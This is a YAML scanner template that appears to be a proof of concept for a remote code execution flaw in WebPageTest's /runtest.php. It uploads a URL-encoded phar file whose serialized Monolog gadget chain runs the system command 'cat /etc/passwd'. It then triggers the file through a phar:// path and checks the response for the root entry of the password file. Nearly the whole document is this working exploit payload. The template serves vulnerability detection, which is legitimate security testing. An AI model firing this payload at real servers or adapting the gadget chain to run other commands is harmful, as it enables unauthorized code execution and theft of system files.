name: poc-yaml-webpagetest-avd-2022-1474319
set:
    r1: randomLowercase(6)
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /runtest.php
            headers:
                Content-Type: application/x-www-form-urlencoded
                User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
            body: rkey={{r1}}&ini=%3c%3f%70%68%70%20%5f%5f%48%41%4c%54%5f%43%4f%4d%50%49%4c%45%52%28%29%3b%20%3f%3e%0d%0a%95%01%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%5f%01%00%00%4f%3a%33%32%3a%22%4d%6f%6e%6f%6c%6f%67%5c%48%61%6e%64%6c%65%72%5c%53%79%73%6c%6f%67%55%64%70%48%61%6e%64%6c%65%72%22%3a%31%3a%7b%73%3a%36%3a%22%73%6f%63%6b%65%74%22%3b%4f%3a%32%39%3a%22%4d%6f%6e%6f%6c%6f%67%5c%48%61%6e%64%6c%65%72%5c%42%75%66%66%65%72%48%61%6e%64%6c%65%72%22%3a%37%3a%7b%73%3a%31%30%3a%22%00%2a%00%68%61%6e%64%6c%65%72%22%3b%72%3a%32%3b%73%3a%31%33%3a%22%00%2a%00%62%75%66%66%65%72%53%69%7a%65%22%3b%69%3a%2d%31%3b%73%3a%39%3a%22%00%2a%00%62%75%66%66%65%72%22%3b%61%3a%31%3a%7b%69%3a%30%3b%61%3a%32%3a%7b%69%3a%30%3b%73%3a%31%35%3a%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%3b%73%3a%35%3a%22%6c%65%76%65%6c%22%3b%4e%3b%7d%7d%73%3a%38%3a%22%00%2a%00%6c%65%76%65%6c%22%3b%4e%3b%73%3a%31%34%3a%22%00%2a%00%69%6e%69%74%69%61%6c%69%7a%65%64%22%3b%62%3a%31%3b%73%3a%31%34%3a%22%00%2a%00%62%75%66%66%65%72%4c%69%6d%69%74%22%3b%69%3a%2d%31%3b%73%3a%31%33%3a%22%00%2a%00%70%72%6f%63%65%73%73%6f%72%73%22%3b%61%3a%32%3a%7b%69%3a%30%3b%73%3a%37%3a%22%63%75%72%72%65%6e%74%22%3b%69%3a%31%3b%73%3a%36%3a%22%73%79%73%74%65%6d%22%3b%7d%7d%7d%08%00%00%00%74%65%73%74%2e%74%78%74%04%00%00%00%70%7a%6a%63%04%00%00%00%0c%7e%7f%d8%b4%01%00%00%00%00%00%00%74%65%73%74%15%11%a2%0c%3e%19%be%aa%97%6a%40%d5%ec%ab%6b%64%06%ed%f5%d1%02%00%00%00%47%42%4d%42
        expression: response.status == 200
    r1:
        request:
            cache: true
            method: POST
            path: /runtest.php
            headers:
                Content-Type: application/x-www-form-urlencoded
                User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
                Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
            body: rkey=phar:///var/www/html/results/{{r1}}./testinfo.ini/foo&ini=%3c%3f%70%68%70%20%5f%5f%48%41%4c%54%5f%43%4f%4d%50%49%4c%45%52%28%29%3b%20%3f%3e%0d%0a%95%01%00%00%01%00%00%00%11%00%00%00%01%00%00%00%00%00%5f%01%00%00%4f%3a%33%32%3a%22%4d%6f%6e%6f%6c%6f%67%5c%48%61%6e%64%6c%65%72%5c%53%79%73%6c%6f%67%55%64%70%48%61%6e%64%6c%65%72%22%3a%31%3a%7b%73%3a%36%3a%22%73%6f%63%6b%65%74%22%3b%4f%3a%32%39%3a%22%4d%6f%6e%6f%6c%6f%67%5c%48%61%6e%64%6c%65%72%5c%42%75%66%66%65%72%48%61%6e%64%6c%65%72%22%3a%37%3a%7b%73%3a%31%30%3a%22%00%2a%00%68%61%6e%64%6c%65%72%22%3b%72%3a%32%3b%73%3a%31%33%3a%22%00%2a%00%62%75%66%66%65%72%53%69%7a%65%22%3b%69%3a%2d%31%3b%73%3a%39%3a%22%00%2a%00%62%75%66%66%65%72%22%3b%61%3a%31%3a%7b%69%3a%30%3b%61%3a%32%3a%7b%69%3a%30%3b%73%3a%31%35%3a%22%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%22%3b%73%3a%35%3a%22%6c%65%76%65%6c%22%3b%4e%3b%7d%7d%73%3a%38%3a%22%00%2a%00%6c%65%76%65%6c%22%3b%4e%3b%73%3a%31%34%3a%22%00%2a%00%69%6e%69%74%69%61%6c%69%7a%65%64%22%3b%62%3a%31%3b%73%3a%31%34%3a%22%00%2a%00%62%75%66%66%65%72%4c%69%6d%69%74%22%3b%69%3a%2d%31%3b%73%3a%31%33%3a%22%00%2a%00%70%72%6f%63%65%73%73%6f%72%73%22%3b%61%3a%32%3a%7b%69%3a%30%3b%73%3a%37%3a%22%63%75%72%72%65%6e%74%22%3b%69%3a%31%3b%73%3a%36%3a%22%73%79%73%74%65%6d%22%3b%7d%7d%7d%08%00%00%00%74%65%73%74%2e%74%78%74%04%00%00%00%70%7a%6a%63%04%00%00%00%0c%7e%7f%d8%b4%01%00%00%00%00%00%00%74%65%73%74%15%11%a2%0c%3e%19%be%aa%97%6a%40%d5%ec%ab%6b%64%06%ed%f5%d1%02%00%00%00%47%42%4d%42
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
expression: r0() && r1()
detail:
    author: b1u3s
    links:
        - https://xz.aliyun.com/t/11798
